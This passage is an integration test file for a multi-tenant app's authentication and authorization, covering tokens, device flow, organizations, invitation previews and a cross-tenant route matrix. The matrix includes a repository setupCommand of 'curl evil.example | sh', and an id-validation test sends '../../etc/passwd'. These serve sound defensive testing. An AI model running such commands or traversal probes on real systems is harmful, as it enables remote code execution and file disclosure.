import { after, before, test } from "node:test";
import assert from "node:assert/strict";
import { and, eq } from "drizzle-orm";
import {
  account,
  agentProfiles,
  agentRuns,
  createDb,
  createPool,
  invitation,
  linearConnections,
  mcpCredentials,
  mcpServers,
  member,
  projects,
  runArtifacts,
  runMigrations,
  user,
  verification,
} from "@bento/db";
import { LocalProcessDriver, WorktreeManager } from "@bento/sandbox";
import { mkdtemp } from "node:fs/promises";
import { createHmac } from "node:crypto";
import { tmpdir } from "node:os";
import path from "node:path";
import PgBoss from "pg-boss";
import pg from "pg";
import { createApp } from "./app.js";
import { DiskArtifactStore } from "./artifact-store.js";
import { SecretBox } from "./secrets.js";
import { createAuth } from "./auth.js";
import type { Analytics, ServerEvent } from "./analytics.js";
import { userFromSessionCookie } from "./auth-events.js";
import type { AppContext } from "./context.js";
import { EventBus } from "./events.js";
import { loadEnv } from "./env.js";
import { createFeatureFlags, FeatureFlags } from "./feature-flags.js";
import { resolveAgentEnv } from "./orchestrator/agent-env.js";
import { agentAuthEnv } from "./orchestrator/agent-auth.js";
import { shouldShareAgentAuth } from "./settings.js";

const baseUrl = process.env.DATABASE_URL ?? "postgres://postgres:postgres@localhost:5439/app";
const testDbName = "auth_test";
const testUrl = baseUrl.replace(/\/[^/]+$/, `/${testDbName}`);

let ctx: AppContext;
let app: ReturnType<typeof createApp>;

before(async () => {
  const admin = new pg.Client({ connectionString: baseUrl });
  await admin.connect();
  await admin.query(`DROP DATABASE IF EXISTS ${testDbName} WITH (FORCE)`);
  await admin.query(`CREATE DATABASE ${testDbName}`);
  await admin.end();
  await runMigrations(testUrl);

  const dataDir = await mkdtemp(path.join(tmpdir(), "bento-auth-"));
  const env = loadEnv({
    BENTO_MODE: "multi",
    DATABASE_URL: testUrl,
    BENTO_DATA_DIR: dataDir,
    BENTO_SANDBOX_DRIVER: "local-process",
    BETTER_AUTH_SECRET: "test-secret-that-is-long-enough-for-hmac",
    BETTER_AUTH_URL: "http://localhost:4400",
    // Off for the shared app: every test signs up and signs in from the
    // same address, which is exactly what the limiter is built to stop.
    // The limiter has its own test, which turns it on.
    BENTO_RATE_LIMIT: "false",
  } as NodeJS.ProcessEnv);

  const pool = createPool(testUrl);
  const db = createDb(pool);
  const boss = new PgBoss({ connectionString: testUrl, schema: "pgboss" });
  boss.on("error", () => {});
  await boss.start();

  ctx = {
    env,
    db,
    pool,
    boss,
    bus: new EventBus(),
    driver: new LocalProcessDriver(),
    worktrees: new WorktreeManager(dataDir),
    secretBox: new SecretBox("test-encryption-key-at-least-32-chars"),
    artifacts: new DiskArtifactStore(dataDir),
    running: new Map(),
    liveInputs: new Map(),
    draining: false,
    userId: "",
    featureFlags: createFeatureFlags(env),
  };
  const auth = createAuth(env, db);
  assert.ok(auth, "multi mode must construct an auth instance");
  ctx.auth = auth;
  app = createApp(ctx);
});

after(async () => {
  await ctx.boss.stop({ close: true, timeout: 1000 });
  await ctx.pool.end();
});

function jsonPost(path: string, body: unknown, token?: string) {
  return app.request(path, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      ...(token ? { authorization: `Bearer ${token}` } : {}),
    },
    body: JSON.stringify(body),
  });
}

test("the API refuses unauthenticated requests in multi mode", async () => {
  const res = await app.request("/api/projects");
  assert.equal(res.status, 401);
});

test("feature flags refuse an anonymous caller and follow the beta testers allowlist", async () => {
  const anonymous = await app.request("/api/flags");
  assert.equal(anonymous.status, 401);

  const signUp = await jsonPost("/api/auth/sign-up/email", {
    email: "flags-user@bento.test",
    password: "correct-horse-battery",
    name: "Flags",
  });
  assert.equal(signUp.status, 200);
  const token = signUp.headers.get("set-auth-token")!;

  const off = await app.request("/api/flags", { headers: { authorization: `Bearer ${token}` } });
  assert.equal(off.status, 200);
  assert.deepEqual(await off.json(), { betaTesters: false });

  const previous = ctx.featureFlags;
  ctx.featureFlags = new FeatureFlags(
    {
      async evaluateFlags(_id, opts) {
        return { isEnabled: () => opts?.personProperties?.email === "flags-user@bento.test" };
      },
      async shutdown() {},
    },
    false,
  );
  try {
    const on = await app.request("/api/flags", { headers: { authorization: `Bearer ${token}` } });
    assert.equal(on.status, 200);
    assert.deepEqual(await on.json(), { betaTesters: true });
  } finally {
    ctx.featureFlags = previous;
  }
});

test("sign up returns a bearer token that authenticates API calls", async () => {
  const res = await jsonPost("/api/auth/sign-up/email", {
    email: "owner@bento.test",
    password: "correct-horse-battery",
    name: "Owner",
  });
  assert.equal(res.status, 200);
  const token = res.headers.get("set-auth-token");
  assert.ok(token, "bearer plugin must expose set-auth-token");

  const projects = await app.request("/api/projects", { headers: { authorization: `Bearer ${token}` } });
  assert.equal(projects.status, 200);
  assert.deepEqual(await projects.json(), []);
});

test("resources are scoped to their owner", async () => {
  const a = await jsonPost("/api/auth/sign-up/email", {
    email: "alice@bento.test",
    password: "correct-horse-battery",
    name: "Alice",
  });
  const b = await jsonPost("/api/auth/sign-up/email", {
    email: "bob@bento.test",
    password: "correct-horse-battery",
    name: "Bob",
  });
  const aToken = a.headers.get("set-auth-token")!;
  const bToken = b.headers.get("set-auth-token")!;

  const created = await jsonPost("/api/projects", { name: "Alice project", localPath: "/tmp" }, aToken);
  assert.equal(created.status, 201);

  const aList = (await (await app.request("/api/projects", { headers: { authorization: `Bearer ${aToken}` } })).json()) as unknown[];
  const bList = (await (await app.request("/api/projects", { headers: { authorization: `Bearer ${bToken}` } })).json()) as unknown[];
  assert.equal(aList.length, 1);
  assert.equal(bList.length, 0, "Bob must not see Alice's projects");
});

/**
 * The device flow has two contract details that are easy to get wrong
 * and only show up against a real server: the endpoints take JSON
 * despite RFC 8628 specifying form encoding, and a code must be claimed
 * by a signed in session before it can be approved.
 */
test("device flow requires JSON and a claim before approval", async () => {
  const signIn = await jsonPost("/api/auth/sign-in/email", {
    email: "owner@bento.test",
    password: "correct-horse-battery",
  });
  const token = signIn.headers.get("set-auth-token")!;

  const formEncoded = await app.request("/api/auth/device/code", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ client_id: "bento-tui" }),
  });
  assert.equal(formEncoded.status, 415, "form encoded bodies are rejected");

  const codeRes = await jsonPost("/api/auth/device/code", { client_id: "bento-tui", scope: "board" });
  assert.equal(codeRes.status, 200);
  const code = (await codeRes.json()) as { device_code: string; user_code: string; interval: number };
  assert.ok(code.device_code && code.user_code);

  const pending = await jsonPost("/api/auth/device/token", {
    grant_type: "urn:ietf:params:oauth:grant-type:device_code",
    device_code: code.device_code,
    client_id: "bento-tui",
  });
  assert.equal(((await pending.json()) as { error: string }).error, "authorization_pending");

  const tooEarly = await jsonPost("/api/auth/device/approve", { userCode: code.user_code }, token);
  const tooEarlyBody = (await tooEarly.json()) as { error_description?: string };
  assert.match(tooEarlyBody.error_description ?? "", /not been claimed/);

  const claim = await app.request(`/api/auth/device?user_code=${code.user_code}`, {
    headers: { authorization: `Bearer ${token}` },
  });
  assert.equal(((await claim.json()) as { status: string }).status, "pending");

  const approved = await jsonPost("/api/auth/device/approve", { userCode: code.user_code }, token);
  assert.equal(((await approved.json()) as { success: boolean }).success, true);

  // Polling again too soon is throttled, so wait out the interval.
  await new Promise((r) => setTimeout(r, (code.interval + 1) * 1000));
  const granted = await jsonPost("/api/auth/device/token", {
    grant_type: "urn:ietf:params:oauth:grant-type:device_code",
    device_code: code.device_code,
    client_id: "bento-tui",
  });
  const grantedBody = (await granted.json()) as { access_token?: string };
  assert.ok(grantedBody.access_token, "approved codes exchange for an access token");

  const withDeviceToken = await app.request("/api/projects", {
    headers: { authorization: `Bearer ${grantedBody.access_token}` },
  });
  assert.equal(withDeviceToken.status, 200, "the device token authenticates API calls");
});

/**
 * Teams share a board: a project belongs to an organization, and every
 * member of that organization can see it. Non-members cannot, which is
 * the part worth guarding against regressions.
 */
test("organization members share projects, outsiders do not", async () => {
  const alice = await jsonPost("/api/auth/sign-up/email", {
    email: "alice@team.test",
    password: "correct-horse-battery",
    name: "Alice",
  });
  const bob = await jsonPost("/api/auth/sign-up/email", {
    email: "bob@team.test",
    password: "correct-horse-battery",
    name: "Bob",
  });
  const aToken = alice.headers.get("set-auth-token")!;
  const bToken = bob.headers.get("set-auth-token")!;

  const orgRes = await jsonPost("/api/auth/organization/create", { name: "Acme", slug: "acme" }, aToken);
  const org = (await orgRes.json()) as { id: string };
  assert.ok(org.id);

  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, aToken);
  const created = await jsonPost("/api/projects", { name: "Team board", localPath: "/tmp" }, aToken);
  assert.equal(created.status, 201);
  assert.equal(((await created.json()) as { organizationId: string }).organizationId, org.id);

  const beforeInvite = (await (
    await app.request("/api/projects", { headers: { authorization: `Bearer ${bToken}` } })
  ).json()) as unknown[];
  assert.equal(beforeInvite.length, 0, "an outsider must not see the team's projects");

  const inviteRes = await jsonPost(
    "/api/auth/organization/invite-member",
    { email: "bob@team.test", role: "member", organizationId: org.id },
    aToken,
  );
  const invite = (await inviteRes.json()) as { id: string };
  await jsonPost("/api/auth/organization/accept-invitation", { invitationId: invite.id }, bToken);

  const afterInvite = (await (
    await app.request("/api/projects", { headers: { authorization: `Bearer ${bToken}` } })
  ).json()) as { name: string }[];
  assert.equal(afterInvite.length, 1);
  assert.equal(afterInvite[0]?.name, "Team board");
});

/**
 * Billing's hours breakdown is by card for the billing month, not by
 * person. Hours before period start do not count, two runs on one
 * card add up, and a probe of another team's period 404s.
 */
test("team hours ranks cards for the active org and 404s a foreign tenant", async () => {
  const owner = await jsonPost("/api/auth/sign-up/email", {
    email: "hours-owner@bento.test",
    password: "correct-horse-battery",
    name: "Hours Owner",
  });
  const stranger = await jsonPost("/api/auth/sign-up/email", {
    email: "hours-stranger@bento.test",
    password: "correct-horse-battery",
    name: "Hours Stranger",
  });
  const ownerToken = owner.headers.get("set-auth-token")!;
  const strangerToken = stranger.headers.get("set-auth-token")!;

  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Hours Co", slug: "hours-co" }, ownerToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, ownerToken);

  const foreignOrg = (await (
    await jsonPost("/api/auth/organization/create", { name: "Hours Foreign", slug: "hours-foreign" }, strangerToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: foreignOrg.id }, strangerToken);

  async function board(
    token: string,
    name: string,
    title: string,
    hours: number,
    startedAt = new Date("2026-09-10T12:00:00.000Z"),
  ) {
    const project = (await (
      await jsonPost("/api/projects", { name, localPath: "/tmp" }, token)
    ).json()) as { id: string };
    const pipeline = (await (
      await app.request(`/api/projects/${project.id}/pipeline`, { headers: { authorization: `Bearer ${token}` } })
    ).json()) as { stages: { id: string; defaultAgentProfileId: string | null }[] };
    const profileId = pipeline.stages[0]?.defaultAgentProfileId;
    assert.ok(profileId, "a new project ships with an agent on the first stage");
    const feature = (await (
      await jsonPost("/api/features", { projectId: project.id, title }, token)
    ).json()) as { id: string };
    await ctx.db.insert(agentRuns).values({
      featureId: feature.id,
      stageId: pipeline.stages[0]!.id,
      agentProfileId: profileId,
      prompt: "work",
      status: "succeeded",
      startedAt,
      endedAt: new Date(startedAt.getTime() + hours * 3_600_000),
    });
    return { featureId: feature.id, stageId: pipeline.stages[0]!.id, profileId };
  }

  const heavy = await board(ownerToken, "Hours board", "Rate limit", 3);
  await board(ownerToken, "Hours board 2", "Login polish", 1);
  await board(strangerToken, "Foreign board", "Secret card", 10);
  await board(ownerToken, "Hours old", "Last month leftover", 8, new Date("2026-08-10T12:00:00.000Z"));
  await ctx.db.insert(agentRuns).values({
    featureId: heavy.featureId,
    stageId: heavy.stageId,
    agentProfileId: heavy.profileId,
    prompt: "more work",
    status: "succeeded",
    startedAt: new Date("2026-09-20T12:00:00.000Z"),
    endedAt: new Date("2026-09-20T14:00:00.000Z"),
  });

  const from = "2026-09-01T00:00:00.000Z";
  const to = "2026-10-01T00:00:00.000Z";
  const missingWindow = await app.request("/api/team/hours", {
    headers: { authorization: `Bearer ${ownerToken}` },
  });
  assert.equal(missingWindow.status, 400);

  const mine = await app.request(`/api/team/hours?from=${from}&to=${to}`, {
    headers: { authorization: `Bearer ${ownerToken}` },
  });
  assert.equal(mine.status, 200);
  const body = (await mine.json()) as { features: { featureId: string; title: string; agentHours: number }[] };
  assert.deepEqual(
    [...body.features].sort((a, b) => b.agentHours - a.agentHours).map((row) => [row.title, row.agentHours]),
    [
      ["Rate limit", 5],
      ["Login polish", 1],
    ],
  );
  assert.ok(body.features.some((row) => row.featureId === heavy.featureId));
  assert.ok(!body.features.some((row) => row.title === "Secret card"));
  assert.ok(!body.features.some((row) => row.title === "Last month leftover"));

  const outsider = await jsonPost("/api/auth/sign-up/email", {
    email: "hours-outsider@bento.test",
    password: "correct-horse-battery",
    name: "Hours Outsider",
  });
  const outsiderToken = outsider.headers.get("set-auth-token")!;
  const refused = await app.request(`/api/team/hours?from=${from}&to=${to}`, {
    headers: { authorization: `Bearer ${outsiderToken}` },
  });
  assert.equal(refused.status, 404);
});

/**
 * The invitation preview is the one read the sign-in page may make
 * before there is a session. It answers only for a live pending
 * invitation id, which travels nowhere but the invitation email, and
 * everything else looks exactly like nothing.
 */
test("an invitation can be previewed before sign in, and only while it is pending", async () => {
  const inviter = await jsonPost("/api/auth/sign-up/email", {
    email: "preview-owner@bento.test",
    password: "correct-horse-battery",
    name: "Preview Owner",
  });
  const token = inviter.headers.get("set-auth-token")!;
  const orgRes = await jsonPost("/api/auth/organization/create", { name: "Preview Team", slug: "preview-team" }, token);
  const org = (await orgRes.json()) as { id: string };
  assert.ok(org.id);

  const inviteRes = await jsonPost(
    "/api/auth/organization/invite-member",
    { email: "preview-invitee@bento.test", role: "member", organizationId: org.id },
    token,
  );
  const invite = (await inviteRes.json()) as { id: string };
  assert.ok(invite.id);

  // Unauthenticated on purpose: holding the id is the authorization.
  const fresh = await app.request(`/api/invitation-preview?id=${invite.id}`);
  assert.equal(fresh.status, 200);
  // The body names a personal address and the URL is the capability,
  // so no shared cache may keep either.
  assert.equal(fresh.headers.get("cache-control"), "no-store");
  const before = (await fresh.json()) as { email: string; organizationName: string; userExists: boolean };
  assert.equal(before.organizationName, "Preview Team");
  assert.equal(before.email.toLowerCase(), "preview-invitee@bento.test");
  assert.equal(before.userExists, false, "the invitee has not signed up yet");

  // Signing up in a different case still counts as the same account.
  const invitee = await jsonPost("/api/auth/sign-up/email", {
    email: "Preview-Invitee@bento.test",
    password: "correct-horse-battery",
    name: "Invitee",
  });
  const inviteeToken = invitee.headers.get("set-auth-token")!;
  const after = (await (await app.request(`/api/invitation-preview?id=${invite.id}`)).json()) as {
    userExists: boolean;
  };
  assert.equal(after.userExists, true, "the invited address now has an account");

  // A spent invitation answers exactly like one that never existed.
  const accepted = await jsonPost("/api/auth/organization/accept-invitation", { invitationId: invite.id }, inviteeToken);
  assert.equal(accepted.status, 200);
  assert.equal((await app.request(`/api/invitation-preview?id=${invite.id}`)).status, 404);
  assert.equal((await app.request("/api/invitation-preview?id=no-such-invitation")).status, 404);
  assert.equal((await app.request("/api/invitation-preview")).status, 404);

  // Expired and cancelled answer the same 404: without these, the
  // seven day window would silently become permanent disclosure.
  const expiredRes = await jsonPost(
    "/api/auth/organization/invite-member",
    { email: "preview-expired@bento.test", role: "member", organizationId: org.id },
    token,
  );
  const expired = (await expiredRes.json()) as { id: string };
  assert.equal((await app.request(`/api/invitation-preview?id=${expired.id}`)).status, 200);
  await ctx.db
    .update(invitation)
    .set({ expiresAt: new Date(Date.now() - 1000) })
    .where(eq(invitation.id, expired.id));
  assert.equal((await app.request(`/api/invitation-preview?id=${expired.id}`)).status, 404);

  const cancelledRes = await jsonPost(
    "/api/auth/organization/invite-member",
    { email: "preview-cancelled@bento.test", role: "member", organizationId: org.id },
    token,
  );
  const cancelled = (await cancelledRes.json()) as { id: string };
  await jsonPost("/api/auth/organization/cancel-invitation", { invitationId: cancelled.id }, token);
  assert.equal((await app.request(`/api/invitation-preview?id=${cancelled.id}`)).status, 404);
});

/**
 * The preview is the one unauthenticated route that touches the
 * database outside better-auth's limiter, so it carries its own brake.
 */
test("the invitation preview meters repeat lookups", async () => {
  for (let i = 0; i < 60; i++) {
    const res = await app.request("/api/invitation-preview?id=rate-limit-probe");
    assert.equal(res.status, 404);
  }
  const throttled = await app.request("/api/invitation-preview?id=rate-limit-probe");
  assert.equal(throttled.status, 429, "the 61st lookup of one id inside a minute is refused");
});

/**
 * The brake that meters a sweep.
 *
 * Per id alone could not: a caller who never repeats an id never
 * repeats a key, so every probe took the fresh window branch, was
 * allowed, and ran its own three table join. Metering the caller is
 * what bounds that, and it only happens where a proxy names one.
 */
test("the invitation preview meters a sweep of distinct ids from one caller", async () => {
  const statuses: number[] = [];
  for (let i = 0; i < 130; i++) {
    const res = await app.request(`/api/invitation-preview?id=sweepprobe${String(i).padStart(4, "0")}`, {
      headers: { "x-forwarded-for": "198.51.100.9" },
    });
    statuses.push(res.status);
  }
  assert.ok(statuses.includes(429), `expected a 429 among ${statuses.slice(0, 5).join(", ")}...`);
  assert.equal(statuses.at(-1), 429, "and the door stays shut for the rest of the window");
});

/**
 * An id that could not exist is refused for the price of a regex,
 * before it reaches the database, and without taking a slot in the
 * limiter's map. Flooding that map used to be worth doing: it cleared
 * itself wholesale at ten thousand entries, which reset the counters
 * of the ids actually being metered.
 */
test("the invitation preview refuses ids that could not exist", async () => {
  for (const id of ["short", "has spaces", "a".repeat(65), "../../etc/passwd", "%00", "a/b"]) {
    const res = await app.request(`/api/invitation-preview?id=${encodeURIComponent(id)}`);
    assert.equal(res.status, 404, `expected ${JSON.stringify(id)} to be refused`);
  }
  // Junk cannot spend a real id's budget: this one is still answering.
  const real = await app.request("/api/invitation-preview?id=stillmetered01");
  assert.equal(real.status, 404, "a well formed id is still served after the junk");
});

/**
 * The console's fallback for an invitee who signed up at the root: the
 * invitations their own address could actually accept. Scoped to the
 * caller, and only offers what the accept endpoint would honour.
 */
test("pending invitations follow the caller's own address", async () => {
  const owner = await jsonPost("/api/auth/sign-up/email", {
    email: "gate-owner@bento.test",
    password: "correct-horse-battery",
    name: "Gate Owner",
  });
  const ownerToken = owner.headers.get("set-auth-token")!;
  const orgRes = await jsonPost("/api/auth/organization/create", { name: "Gate Team", slug: "gate-team" }, ownerToken);
  const org = (await orgRes.json()) as { id: string };
  const inviteRes = await jsonPost(
    "/api/auth/organization/invite-member",
    { email: "gate-invitee@bento.test", role: "member", organizationId: org.id },
    ownerToken,
  );
  const invite = (await inviteRes.json()) as { id: string };

  const invitee = await jsonPost("/api/auth/sign-up/email", {
    email: "gate-invitee@bento.test",
    password: "correct-horse-battery",
    name: "Gate Invitee",
  });
  const inviteeToken = invitee.headers.get("set-auth-token")!;
  const outsider = await jsonPost("/api/auth/sign-up/email", {
    email: "gate-outsider@bento.test",
    password: "correct-horse-battery",
    name: "Gate Outsider",
  });
  const outsiderToken = outsider.headers.get("set-auth-token")!;

  const mine = (await (
    await app.request("/api/team/invitations", { headers: { authorization: `Bearer ${inviteeToken}` } })
  ).json()) as { id: string; organizationName: string }[];
  assert.deepEqual(mine, [{ id: invite.id, organizationName: "Gate Team" }]);

  const theirs = (await (
    await app.request("/api/team/invitations", { headers: { authorization: `Bearer ${outsiderToken}` } })
  ).json()) as unknown[];
  assert.deepEqual(theirs, [], "another account sees nothing of it");

  // An expired invitation vanishes rather than being offered to a page
  // that can only refuse it.
  await ctx.db
    .update(invitation)
    .set({ expiresAt: new Date(Date.now() - 1000) })
    .where(eq(invitation.id, invite.id));
  const after = (await (
    await app.request("/api/team/invitations", { headers: { authorization: `Bearer ${inviteeToken}` } })
  ).json()) as unknown[];
  assert.deepEqual(after, [], "an expired invitation is not offered");
});

/**
 * The invitation must survive the verification detour: sign-up on the
 * invitation page sends the accept page as callbackURL, and the emailed
 * link has to land back there rather than on the board.
 */
test("the verification email returns an invitee to the invitation", async () => {
  const gatedEnv = loadEnv({
    BENTO_MODE: "multi",
    DATABASE_URL: testUrl,
    BENTO_DATA_DIR: "/tmp",
    BENTO_SANDBOX_DRIVER: "local-process",
    BETTER_AUTH_SECRET: "test-secret-that-is-long-enough-for-hmac",
    BETTER_AUTH_URL: "http://localhost:4400",
    BENTO_REQUIRE_EMAIL_VERIFICATION: "true",
  } as NodeJS.ProcessEnv);
  const sent: { to: string; subject: string; text: string }[] = [];
  const gatedAuth = createAuth(gatedEnv, ctx.db, {
    description: "test",
    async send(message) {
      sent.push(message);
    },
  });
  assert.ok(gatedAuth);
  const gatedApp = createApp({ ...ctx, env: gatedEnv, auth: gatedAuth });

  // The invitation is minted on the ungated app, where the owner
  // already holds a session.
  const owner = await jsonPost("/api/auth/sign-up/email", {
    email: "detour-owner@bento.test",
    password: "correct-horse-battery",
    name: "Detour Owner",
  });
  const ownerToken = owner.headers.get("set-auth-token")!;
  const orgRes = await jsonPost(
    "/api/auth/organization/create",
    { name: "Detour Team", slug: "detour-team" },
    ownerToken,
  );
  const org = (await orgRes.json()) as { id: string };
  const inviteRes = await jsonPost(
    "/api/auth/organization/invite-member",
    { email: "detour-invitee@bento.test", role: "member", organizationId: org.id },
    ownerToken,
  );
  const invite = (await inviteRes.json()) as { id: string };

  const signUp = await gatedApp.request("/api/auth/sign-up/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      email: "detour-invitee@bento.test",
      password: "correct-horse-battery",
      name: "Detour Invitee",
      callbackURL: `/accept-invitation?id=${invite.id}`,
    }),
  });
  assert.equal(signUp.status, 200);
  assert.equal(signUp.headers.get("set-auth-token"), null, "no session until the address is confirmed");

  const mail = sent.find((m) => m.to === "detour-invitee@bento.test");
  assert.ok(mail, "the verification email went out");
  const link = /(?<url>http[^\s]*verify-email\?token=[^\s]+)/.exec(mail.text)?.groups?.url;
  assert.ok(link, "carrying a usable link");
  const parsed = new URL(link);
  const verify = await gatedApp.request(parsed.pathname + parsed.search);
  assert.ok(verify.status === 302 || verify.status === 200, `verification answered ${verify.status}`);
  const location = verify.headers.get("location") ?? "";
  assert.ok(
    location.includes(`/accept-invitation?id=${invite.id}`),
    `the link lands on the invitation, got ${location || "(no redirect)"}`,
  );
});

/**
 * The authorization matrix: every route that acts on a feature, run,
 * stage, or project must refuse a token from a different tenant. This
 * exists because the earlier "scoped to owner" test only covered
 * listing, which let unscoped by-id routes ship.
 */
test("every entity route refuses a foreign tenant", async () => {
  const owner = await jsonPost("/api/auth/sign-up/email", {
    email: "matrix-owner@bento.test",
    password: "correct-horse-battery",
    name: "Owner",
  });
  const intruder = await jsonPost("/api/auth/sign-up/email", {
    email: "matrix-intruder@bento.test",
    password: "correct-horse-battery",
    name: "Intruder",
  });
  const ownerToken = owner.headers.get("set-auth-token")!;
  const intruderToken = intruder.headers.get("set-auth-token")!;

  const asOwner = (path: string, init: RequestInit = {}) =>
    app.request(path, { ...init, headers: { "content-type": "application/json", authorization: `Bearer ${ownerToken}`, ...(init.headers ?? {}) } });
  const asIntruder = (path: string, init: RequestInit = {}) =>
    app.request(path, { ...init, headers: { "content-type": "application/json", authorization: `Bearer ${intruderToken}`, ...(init.headers ?? {}) } });

  // The owner sets up a project, feature, stage assignment, and a run.
  const project = (await (
    await asOwner("/api/projects", { method: "POST", body: JSON.stringify({ name: "Matrix", localPath: "/tmp" }) })
  ).json()) as { id: string };
  const pipeline = (await (await asOwner(`/api/projects/${project.id}/pipeline`)).json()) as {
    id: string;
    stages: { id: string }[];
  };
  const stageId = pipeline.stages[0]!.id;
  // A new project comes with an agent on every stage, so advancing a
  // card would start one and this test's own run would be refused as a
  // second agent on the same card. It assigns its own below.
  for (const stage of pipeline.stages) {
    await asOwner(`/api/stages/${stage.id}`, {
      method: "PATCH",
      body: JSON.stringify({ defaultAgentProfileId: null }),
    });
  }
  const repos = (await (await asOwner(`/api/projects/${project.id}/repositories`)).json()) as { id: string }[];
  const repoId = repos[0]!.id;
  const feature = (await (
    await asOwner("/api/features", { method: "POST", body: JSON.stringify({ projectId: project.id, title: "Mine" }) })
  ).json()) as { id: string };
  await asOwner(`/api/features/${feature.id}/advance`, { method: "POST" });
  const profile = (await (
    await asOwner("/api/profiles", { method: "POST", body: JSON.stringify({ name: "m", cli: "fake", model: "fake-1" }) })
  ).json()) as { id: string };
  const run = (await (
    await asOwner("/api/runs", { method: "POST", body: JSON.stringify({ featureId: feature.id, agentProfileId: profile.id }) })
  ).json()) as { id: string };
  // Named here, because every run-shaped row below reads as "undefined"
  // otherwise and the matrix reports a 500 instead of the real cause.
  assert.ok(run.id, "the owner's run must exist for the run routes to be probed");
  // Inserted directly because only the executor creates artifact rows;
  // the matrix still needs one to probe the artifact routes with.
  const [artifact] = await ctx.db
    .insert(runArtifacts)
    .values({
      runId: run.id,
      featureId: feature.id,
      stageSlug: "matrix",
      stageName: "Matrix",
      path: "docs/bento/matrix.md",
      kind: "markdown",
      mime: "text/markdown",
      size: 5,
      content: "mine.",
    })
    .returning({ id: runArtifacts.id });
  assert.ok(artifact?.id, "the owner's artifact must exist for the artifact routes to be probed");

  // Inserted directly: the matrix users have no organization, and the
  // MCP routes refuse org-less callers in multi mode outright. The row
  // gives the probes a real id to aim at; the org-scoped refusal is
  // exercised in "members read the MCP registry and only admins manage
  // it" below, where organizations exist.
  const [ownerRow] = await ctx.db.select({ id: user.id }).from(user).where(eq(user.email, "matrix-owner@bento.test"));
  const [mcpServer] = await ctx.db
    .insert(mcpServers)
    .values({
      ownerId: ownerRow!.id,
      organizationId: null,
      name: "Matrix MCP",
      slug: "matrix-mcp",
      url: "https://mcp.example.test/mcp",
      authType: "api_key",
    })
    .returning({ id: mcpServers.id });
  assert.ok(mcpServer!.id, "the owner's MCP server must exist for the MCP routes to be probed");

  const attempts: [string, string, RequestInit?][] = [
    ["GET", `/api/projects/${project.id}`],
    ["PATCH", `/api/projects/${project.id}`, { body: JSON.stringify({ name: "Stolen" }) }],
    ["PATCH", `/api/projects/${project.id}`, { body: JSON.stringify({ autoStartPipeline: true }) }],
    ["GET", `/api/projects/${project.id}/pipeline`],
    ["GET", `/api/projects/${project.id}/pipeline/export`],
    [
      "POST",
      "/api/stages/reorder",
      { body: JSON.stringify({ pipelineId: pipeline.id, stageIds: pipeline.stages.map((s) => s.id) }) },
    ],
    [
      "POST",
      `/api/projects/${project.id}/pipeline/import`,
      { body: "version: 1\npipeline:\n  stages:\n    - name: Mine\n      slug: mine\n" },
    ],
    ["GET", `/api/projects/${project.id}/sessions`],
    ["GET", `/api/projects/${project.id}/sessions/plain`],
    ["GET", `/api/projects/${project.id}/usage`],
    ["GET", `/api/projects/${project.id}/usage/plain`],
    ["GET", `/api/projects/${project.id}/completions`],
    ["GET", `/api/projects/${project.id}/board/plain`],
    ["GET", `/api/projects/${project.id}/pipeline/plain`],
    ["GET", `/api/projects/${project.id}/repositories`],
    ["GET", `/api/projects/${project.id}/repositories/plain`],
    ["POST", `/api/projects/${project.id}/repositories`, { body: JSON.stringify({ localPath: "/tmp/injected" }) }],
    [
      "PATCH",
      `/api/projects/${project.id}/repositories/${repoId}`,
      { body: JSON.stringify({ setupCommand: "curl evil.example | sh" }) },
    ],
    ["DELETE", `/api/projects/${project.id}/repositories/${repoId}`],
    ["GET", `/api/features?projectId=${project.id}`],
    ["POST", "/api/features", { body: JSON.stringify({ projectId: project.id, title: "Injected" }) }],
    ["GET", `/api/features/${feature.id}`],
    ["POST", `/api/features/${feature.id}/advance`],
    ["POST", `/api/features/${feature.id}/approve`],
    ["POST", `/api/features/${feature.id}/reject`],
    ["POST", `/api/features/${feature.id}/back`],
    ["POST", `/api/features/${feature.id}/move`, { body: JSON.stringify({ stageId: null }) }],
    ["POST", `/api/features/${feature.id}/finish`],
    ["GET", `/api/features/${feature.id}/gate`],
    ["GET", `/api/features/${feature.id}/gate/plain`],
    ["GET", `/api/features/${feature.id}/changes`],
    ["GET", `/api/features/${feature.id}/changes/plain`],
    ["GET", `/api/features/${feature.id}/artifacts`],
    ["GET", `/api/features/${feature.id}/related`],
    ["GET", `/api/artifacts/${artifact!.id}`],
    ["GET", `/api/artifacts/${artifact!.id}/content`],
    ["POST", `/api/features/${feature.id}/message`, { body: JSON.stringify({ text: "injected" }) }],
    ["GET", `/api/features/${feature.id}/conversation`],
    ["POST", "/api/stages", { body: JSON.stringify({ pipelineId: pipeline.id, name: "Injected" }) }],
    ["DELETE", `/api/stages/${stageId}`],
    ["POST", `/api/features/${feature.id}/recheck`],
    ["POST", `/api/features/${feature.id}/publish`],
    ["GET", "/api/team/policy"],
    ["GET", "/api/team/hours"],
    ["PATCH", "/api/team/policy", { body: JSON.stringify({ restrictNetwork: false }) }],
    ["POST", `/api/features/${feature.id}/link-pr`, { body: JSON.stringify({ prNumber: 1 }) }],
    ["GET", `/api/features/${feature.id}/merge-status`],
    ["GET", `/api/features/${feature.id}/merge-status/plain`],
    ["POST", `/api/features/${feature.id}/resolve-conflicts`],
    ["POST", `/api/features/${feature.id}/quick-run?cli=fake`],
    ["GET", `/api/features/${feature.id}/transitions`],
    ["GET", `/api/features/${feature.id}/history`],
    ["GET", `/api/features/${feature.id}/history/plain`],
    ["GET", `/api/stages/${stageId}`],
    ["PATCH", `/api/stages/${stageId}`, { body: JSON.stringify({ gateCriteria: [{ type: "command", cmd: "id", timeoutSec: 5 }] }) }],
    ["PATCH", `/api/profiles/${profile.id}`, { body: JSON.stringify({ name: "stolen" }) }],
    ["DELETE", `/api/profiles/${profile.id}`],
    ["POST", "/api/runs", { body: JSON.stringify({ featureId: feature.id, agentProfileId: profile.id }) }],
    ["GET", `/api/runs/${run.id}`],
    ["POST", `/api/runs/${run.id}/resume`, { body: JSON.stringify({ prompt: "hi" }) }],
